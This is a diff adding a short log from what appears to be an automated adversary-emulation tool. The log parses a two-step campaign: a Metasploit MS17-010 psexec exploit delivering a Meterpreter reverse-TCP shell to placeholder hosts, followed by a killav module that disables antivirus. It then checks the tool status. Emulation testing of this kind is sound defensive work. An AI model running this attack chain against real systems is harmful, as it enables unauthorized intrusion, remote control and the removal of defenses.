@@ -1,0 +1,7 @@
+2020-03-30 22:45:12,976- attack-thread - INFO - Category Not Found
+2020-03-30 22:45:13,055- attack-thread - INFO - ....................Parsing the Campaign....................
+2020-03-30 22:45:13,182- attack-thread - INFO - [{'TA01_T1190_P1': {'name': 'ms17_010_psexec', 'tactic': 'Initial_Access', 'try_count': 3, 'tool': 'metasploit', 'exploit': 'windows/smb/ms17_010_psexec', 'payload': 'windows/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'RHOSTS': 'RHOSTS_$ref'}}}, {'TA05_T1089_P2': {'name': 'killav', 'tactic': 'Defense_Evasion', 'try_count': 3, 'tool': 'meterpreter', 'type': 'script', 'script': 'post/windows/manage/killav'}}]
+2020-03-30 22:45:13,182- attack-thread - INFO - *****************************Check tools status*****************************
+2020-03-30 22:45:13,183- attack-thread - INFO - ['metasploit', 'meterpreter']
+2020-03-30 22:45:13,184- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-30 22:45:13,185- attack-thread - INFO - meterpreter = [33mDEPENDS_ON_METASPLOIT[0m
